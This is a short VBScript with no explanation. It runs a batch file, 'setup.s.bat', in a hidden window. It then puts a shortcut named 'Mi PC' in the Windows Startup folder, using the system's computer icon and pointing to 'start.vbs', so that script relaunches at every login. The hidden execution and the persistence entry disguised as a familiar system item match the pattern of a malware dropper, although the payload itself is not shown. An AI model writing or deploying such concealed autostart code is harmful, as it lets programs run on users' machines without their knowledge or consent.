Set objShell = CreateObject("WScript.Shell")
objShell.Run "setup.s.bat", 0

Set objShell = CreateObject("WScript.Shell")
strStartupFolder = objShell.SpecialFolders("Startup")

strShortcutPath = strStartupFolder & "\Mi PC.lnk"
strTargetPath = objShell.CurrentDirectory & "\start.vbs"

Set objShortcut = objShell.CreateShortcut(strShortcutPath)

objShortcut.TargetPath = strTargetPath
objShortcut.Description = "Mi PC"
objShortcut.IconLocation = "%SystemRoot%\System32\shell32.dll,15"
objShortcut.Save